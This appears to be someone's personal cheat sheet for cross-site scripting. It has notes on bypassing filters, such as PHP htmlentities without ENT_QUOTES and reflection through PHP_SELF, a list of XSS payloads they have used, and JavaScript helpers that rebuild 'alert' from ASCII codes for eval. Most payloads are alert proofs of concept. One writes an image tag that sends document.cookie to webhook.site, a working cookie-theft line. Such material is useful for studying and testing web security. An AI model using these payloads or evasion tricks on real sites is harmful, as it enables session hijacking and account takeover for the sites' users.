# NOTES
   1. Whenever you try any payload for xss.
      1) If value is reflected in response.
      2) If any special characters are html encoded??
   2. What if script or any malicious word is blocked?
      1) There are multiple ways to execute javascript
      2) for eg
      3) in case we are allowed to paste link and it is referenced directly in a HREF tag then <a href="javascript:alert(1)"/>google</a> this payload can be used.
      4) div tag, img tag, and there are many tags who has javascript events loaded.
   3. What if alert is blocked and script is not blocked
      1) convert ascii value of alert and payload to string and paste it in eval, if script is not blocked ... very rare.
   4. What if, we can escape the js by single quotes and comment?
   5. What if, special characters are html encoded?
      1) Here, it is common in php to use htmlentities as encoding function.
      2) But, if we do not set ENT_QUOTES flag...function won't encode ' (single quotes) and we can use it to escape it.
   6. Sometimes,  developer used and trusted PHP_SELF which is the path provided by the user. 
      1) So, this time, if index.php is where response is reflected, try to do something like this -> /index.php/XSS_Payload
      2) Check the source code, if /index.php/1 is reflected in forms tag, then replace 1 with XSS_Payload



# Payloads I used
   ```
   <script>alert(1)</script>
   <script>eval("ale"%2B"rt(1)")</script>
   <script>prompt(1)</script>
   <Script>alert(1)</Script>
   <scr<script>ipt>alert(1)</scr</script>ipt>
   <a href="google.com" onmouseover="alert(1)">google</a>
   <a href="google.com" onmouseout="alert(1)">google</a>
   <a href="google.com" onmousemove="alert(1)">google</a>
   <a href="google.com" onclick="alert(1)">google</a>
   <a href="google.com" onClick="alert(1)">google</a>
   <a href="javascript:alert(1)"/>google</a>
   <img src="zzzz" onErRor="alert(1)"/>
   <div onmousemove="alert(1)" onmouseout="alert(1)"></div>
   "><script>alert(1)</script>//
   '><script>alert(1)</script>//
   "><script>alert(1)</script>
   /index.php/"><script>alert(1)</script>
   #<h1><script>alert('9a9ae151-0c35-4b79-92ff-ddbf76907027')</script></h1>
   #<script>document.write('<img src="webhook.site?c="'%2Bdocument.cookie%2B'"/>')</script>
   <script></script>
   ```

# Functions
   ```
   // --------------------------alert is blocked-----------------------------
   function convertor(num){
      return num.toString().split('').map(Number).map(n => (n || 10) + 64).map(c => String.fromCharCode(c)).join('');
   }

   function asciitochar(arr){
      xd = arr.map(c => String.fromCharCode(c)).join('')
      return xd;
   }

   function toascii(strs){
      xd = strs.split('').map(c => c.charCodeAt(c))
      return xd;
   }

   /* 1 - 49
   2 - 50
   3 - 51
   4 - 52
   5 - 53
   6 - 54
   7 - 55
   8 - 56
   9 - 57 */

   console.log(convertor(3))
   console.log(asciitochar([97, 108, 101, 114, 116, 40, 39, 57, 97, 57, 97, 101, 49, 53, 49, 45, 48, 99, 51, 53, 45, 52, 98, 55, 57, 45, 57, 50, 102, 102, 45, 100, 100, 98, 102, 55, 54, 57, 48, 55, 48, 50, 55, 39, 41]))
   console.log(toascii("'"))

   /* [57, 97, 57, 97, 101, 49, 53, 49, 45, 48, 99, 51, 53, 45, 52, 98, 55, 57, 45, 57, 50, 102, 102, 45, 100, 100, 98, 102, 55, 54, 57, 48, 55, 48, 50, 55] */

   // [97, 108, 101, 114, 116]
   /* [97, 108, 101, 114, 116, 40, 55, 42, 55, 41] */
   /* console.log(asciitochar()) */
   /* console.log(eval([97, 108, 101, 114, 116, 40, 55, 42, 55, 41].map(c => String.fromCharCode(c)).join('')) */
   /* console.log(eval([57, 97, 57, 97, 101, 49, 53, 49, 45, 48, 99, 51, 53, 45, 52, 98, 55, 57, 45, 57, 50, 102, 102, 45, 100, 100, 98, 102, 55, 54, 57, 48, 55, 48, 50, 55].map(c => String.fromCharCode(c)).join(''))) */

   /* [NaN, 97, NaN, 97, 101, NaN, NaN, NaN, 45, 48, 99, NaN, NaN, 45, NaN, 98, NaN, NaN, 45, NaN, NaN, 102, 102, 45, 100, 100, 98, 102, NaN, NaN, NaN, 48, NaN, 48, NaN, NaN] */

   /* console.log(eval([97, 108, 101, 114, 116, 40, 39, 57, 97, 57, 97, 101, 49, 53, 49, 45, 48, 99, 51, 53, 45, 52, 98, 55, 57, 45, 57, 50, 102, 102, 45, 100, 100, 98, 102, 55, 54, 57, 48, 55, 48, 50, 55, 39, 41].map(c => String.fromCharCode(c)).join(''))) */

   console.log(eval([97, 108, 101, 114, 116, 40, 39, 57, 97, 57, 97, 101, 49, 53, 49, 45, 48, 99, 51, 53, 45, 52, 98, 55, 57, 45, 57, 50, 102, 102, 45, 100, 100, 98, 102, 55, 54, 57, 48, 55, 48, 50, 55, 39, 41].map(c => String.fromCharCode(c)).join('')))

   // --------------------------------------------------------------------------
   ```